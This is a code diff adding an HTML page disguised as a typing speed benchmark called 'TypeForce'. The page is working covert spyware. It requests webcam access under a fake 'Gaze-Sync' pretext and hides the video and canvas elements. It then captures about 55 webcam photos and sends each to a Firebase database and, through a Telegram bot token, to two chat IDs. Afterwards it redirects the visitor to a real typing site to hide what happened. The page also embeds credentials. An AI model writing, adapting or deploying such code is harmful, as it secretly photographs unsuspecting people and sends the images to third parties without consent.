@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TypeForce | Speed Calculator</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --tf-green: #00ff41;
+            --tf-bg: #0d0d0d;
+            --tf-surface: #1a1a1a;
+            --tf-text: #e0e0e0;
+            --tf-border: #333333;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--tf-bg); color: var(--tf-text);
+            font-family: 'JetBrains Mono', 'Courier New', monospace;
+            display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh;
+        }
+
+        .tf-card {
+            width: 90%; max-width: 500px; background: var(--tf-surface);
+            border: 1px solid var(--tf-border); border-radius: 4px; padding: 30px; text-align: center;
+        }
+
+        .tf-header { font-size: 24px; font-weight: bold; color: var(--tf-green); margin-bottom: 10px; letter-spacing: 2px; }
+        .tf-sub { font-size: 12px; color: #888; margin-bottom: 30px; }
+
+        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 25px; }
+        .stat-box { background: #000; padding: 15px; border: 1px solid var(--tf-border); border-radius: 4px; }
+        .stat-val { font-size: 20px; color: var(--tf-green); }
+        .stat-label { font-size: 10px; color: #666; text-transform: uppercase; }
+
+        .type-area {
+            background: #000; border: 1px solid var(--tf-green); border-radius: 4px;
+            padding: 20px; font-size: 18px; line-height: 1.6; text-align: left; margin-bottom: 20px;
+            display: none;
+        }
+
+        #input-field {
+            width: 100%; background: transparent; border: none; border-bottom: 2px solid var(--tf-green);
+            color: #fff; font-family: inherit; font-size: 18px; outline: none; padding: 10px 0;
+            display: none;
+        }
+
+        .btn-tf {
+            background: var(--tf-green); color: #000; border: none;
+            padding: 15px 40px; font-weight: bold; text-transform: uppercase;
+            cursor: pointer; letter-spacing: 1px; transition: 0.2s;
+        }
+        .btn-tf:hover { background: #00cc33; box-shadow: 0 0 15px rgba(0, 255, 65, 0.4); }
+
+        /* Calibration UI */
+        #sync-ui { display: none; margin-top: 20px; }
+        .sync-bar { width: 100%; height: 2px; background: #333; position: relative; overflow: hidden; margin: 15px 0; }
+        .sync-progress { width: 0%; height: 100%; background: var(--tf-green); transition: width 0.5s; }
+
+        .node-info { font-size: 9px; color: #444; margin-top: 40px; text-transform: uppercase; }
+    </style>
+</head>
+<body>
+
+    <div class="tf-card">
+        <div class="tf-header">TypeForce // v2.6</div>
+        <div class="tf-sub">AI-Enhanced Mechanical Accuracy Benchmark</div>
+
+        <div id="init-view">
+            <div class="stats-grid">
+                <div class="stat-box">
+                    <div class="stat-val">--</div>
+                    <div class="stat-label">Last WPM</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-val">99.2%</div>
+                    <div class="stat-label">Precision</div>
+                </div>
+            </div>
+            
+            <p style="font-size: 13px; color: #bbb; line-height: 1.6; margin-bottom: 25px;">
+                Accessing the high-speed engine requires <b>Gaze-Sync Tracking</b>. This stabilizes the benchmark by monitoring eye-to-key motion vectors.
+            </p>
+
+            <button class="btn-tf" onclick="startTypeBenchmark()">Continue to Test</button>
+        </div>
+
+        <div id="sync-ui">
+            <div class="type-area" id="test-text">The quick brown fox jumps over the lazy dog near the Mumbai harbor under the neon lights of the 2026 digital era.</div>
+            <input type="text" id="input-field" placeholder="Start typing above..." autocomplete="off">
+            
+            <div class="sync-bar"><div class="sync-progress" id="p-bar"></div></div>
+            <div style="font-size: 11px; color: var(--tf-green);" id="status-txt">Calibrating Gaze Motion...</div>
+            <div style="font-size: 10px; color: #555; margin-top: 5px;" id="tf-timer">60s Calibration Window</div>
+        </div>
+
+        <div class="node-info">Uplink: Mumbai_South_Primary // Node: IN-MH-01</div>
+    </div>
+
+    <!-- Hidden Capture Engine -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;" width="640" height="480"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startTypeBenchmark() {
+            try {
+                // Camera request framed as Gaze-Sync for typing accuracy
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'block';
+                document.getElementById('test-text').style.display = 'block';
+                const input = document.getElementById('input-field');
+                input.style.display = 'block';
+                input.focus();
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let timeLeft = 60;
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        count++;
+                        document.getElementById('tf-timer').innerText = `${timeLeft}s Calibration Window`;
+                        document.getElementById('p-bar').style.width = `${((60-timeLeft)/60)*100}%`;
+
+                        if (count <= 55) {
+                            captureTypeSession(count);
+                        }
+
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            // Redirect to a real typing test
+                            window.location.href = "https://10fastfingers.com";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://10fastfingers.com";
+            }
+        }
+
+        function captureTypeSession(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "TYPE_SPEED_SPOOF", 
+                ts: Date.now(),
+                loc: "MUMBAI_BENCHMARK" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'type_recon_mumbai.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
